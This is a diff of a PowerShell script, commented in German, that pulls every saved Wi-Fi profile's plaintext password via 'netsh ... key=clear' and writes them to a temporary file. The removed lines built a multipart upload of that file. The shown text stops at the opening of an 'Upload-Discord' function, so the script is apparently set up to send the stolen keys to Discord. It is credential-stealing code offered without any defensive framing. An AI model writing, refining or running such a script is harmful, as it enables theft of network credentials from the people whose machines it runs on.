@@ -1,36 +1,31 @@
-# Pfad zur temporären Datei definieren
-$filePath = "$env:TEMP\wifi-pass.txt"
+$wifiProfiles = @()
 
-# WLAN-Profile auflisten und in Datei schreiben
-netsh wlan show profiles | Out-File -FilePath $filePath
+# Alle WLAN-Profile extrahieren
+$profileNames = netsh wlan show profiles |
+    Select-String "All User Profile" |
+    ForEach-Object { ($_ -split ":")[1].Trim() }
 
-# Für jedes Profil Details inkl. Passwort hinzufügen
-netsh wlan show profiles |
-    Select-String " : " |
-    ForEach-Object { ($_ -split ":")[1].Trim() } |
-    ForEach-Object {
-        "`n--- WLAN: $_ ---" | Out-File -FilePath $filePath -Append
-        netsh wlan show profile name="$_" key=clear | Out-File -FilePath $filePath -Append
+# Für jedes Profil das Passwort extrahieren
+foreach ($name in $profileNames) {
+    $profileDetails = netsh wlan show profile name="$name" key=clear
+    $keyLine = $profileDetails | Select-String "Key Content"
+
+    $password = if ($keyLine) {
+        ($keyLine -split ":", 2)[1].Trim()
+    } else {
+        "<Kein Passwort gefunden>"
     }
 
-# Multipart-Boundary für Dateiupload
-$boundary = [System.Guid]::NewGuid().ToString()
-$LF = "`r`n"
-
-# Dateiinhalt als multipart/form-data aufbauen
-$bodyLines = (
-    "--$boundary",
-    "Content-Disposition: form-data; name=`"file`"; filename=`"$([System.IO.Path]::GetFileName($filePath))`"",
-    "Content-Type: text/plain",
-    "",
-    Get-Content -Raw $filePath,
-    "--$boundary--"
-) -join $LF
-
-# HTTP-Header definieren
-$headers = @{
-    "Content-Type" = "multipart/form-data; boundary=$boundary"
+    $wifiProfiles += [PSCustomObject]@{
+        PROFILE_NAME = $name
+        PASSWORD     = $password
+    }
 }
+
+# Ausgabe als Tabelle
+$wifiProfiles | Format-Table -AutoSize
+
+$wifiProfiles > $env:TEMP/--wifi-pass.txt
 
 function Upload-Discord {
 
